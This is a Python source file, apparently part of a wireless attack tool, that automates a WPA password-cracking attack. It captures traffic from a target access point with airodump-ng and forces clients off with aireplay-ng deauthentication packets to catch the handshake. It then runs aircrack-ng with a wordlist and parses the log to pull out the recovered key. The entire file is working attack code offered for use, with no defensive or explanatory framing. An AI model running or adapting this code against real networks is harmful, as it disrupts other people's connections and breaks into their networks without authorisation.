import os
import time
import pexpect
import subprocess

import src.settings as settings
from poormanslogging import info, warn, error

def run():
	if os.path.exists(settings.OS_PATH + '/cr0z0n0_attack-01.csv'):
		os.remove(settings.OS_PATH + '/cr0z0n0_attack-01.csv')
		os.remove(settings.OS_PATH + '/cr0z0n0_attack-01.cap')
		os.remove(settings.OS_PATH + '/cr0z0n0_attack-01.kismet.csv')
		os.remove(settings.OS_PATH + '/cr0z0n0_attack-01.kismet.netxml')

	proc_airodump = subprocess.Popen(['airodump-ng', '--bssid', settings.TARGET_BSSID, '-c', settings.TARGET_CHANNEL, '-w', 'cr0z0n0_attack', settings.INTERFACE_MON],
						stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

	cmd_aireplay = pexpect.spawn('aireplay-ng -0 10 -a {0} {1}'.format(settings.TARGET_BSSID, settings.INTERFACE_MON))
	time.sleep(10)
	cmd_aireplay.close()
	time.sleep(settings.WPA_EXPECT_HANDSHAKE_TIME)

	cmd_crack = pexpect.spawn('aircrack-ng -w dic cr0z0n0_attack-01.cap')
	cmd_crack.logfile = open(settings.LOG_FILE, 'wb')
	cmd_crack.expect(['KEY FOUND!', 'Failed', pexpect.TIMEOUT, pexpect.EOF])
	cmd_crack.close()

	parse_log_crack = open(settings.LOG_FILE, 'r')
	for line in parse_log_crack:
		where = line.find('KEY FOUND!')
		if where > -1:
			key_end = line.find(']')
			settings.TARGET_KEY = line[where + 13:key_end]
	parse_log_crack.close()
	os.remove(settings.LOG_FILE)
